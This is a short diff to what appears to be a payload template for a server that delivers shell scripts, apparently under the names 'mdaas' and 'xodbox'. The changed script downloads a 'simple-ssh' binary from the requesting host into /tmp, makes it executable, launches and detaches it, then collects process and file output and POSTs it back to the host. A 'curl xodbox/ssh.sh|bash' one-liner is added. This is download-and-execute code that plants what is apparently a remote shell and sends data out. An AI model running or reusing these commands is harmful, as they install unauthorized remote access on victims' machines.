@@ -9,12 +9,19 @@ data:
     Content-Type: text/plain
   body: |
     DEST_FILE=/tmp/s
-    if [ ! -f $DEST_FILE ]; then
-      OS=$(uname)
-      ARCH=$(uname -m)
-      curl {{.Request.Host}}/mdaas/$OS/$ARCH/simple-ssh > $DEST_FILE
-      chmod +x $DEST_FILE
-    fi
-    bash -c "$DEST_FILE & disown" &
+    OS=$(uname)
+    ARCH=$(uname -m)
+    curl {{.Request.Host}}/mdaas/$OS/$ARCH/simple-ssh > $DEST_FILE
+    chmod +x $DEST_FILE
+    bash -c "$DEST_FILE > /tmp/bso 2>&1 &" &
+    r=$(ps aux | grep bs ;cat /tmp/bso; ls -lah /tmp/bs)
     disown
+
+    echo $r
+    curl "{{.Request.Host}}/l/res/" --data "$r" -X POST
 ---
+
+
+```bash
+curl xodbox/ssh.sh|bash
+```
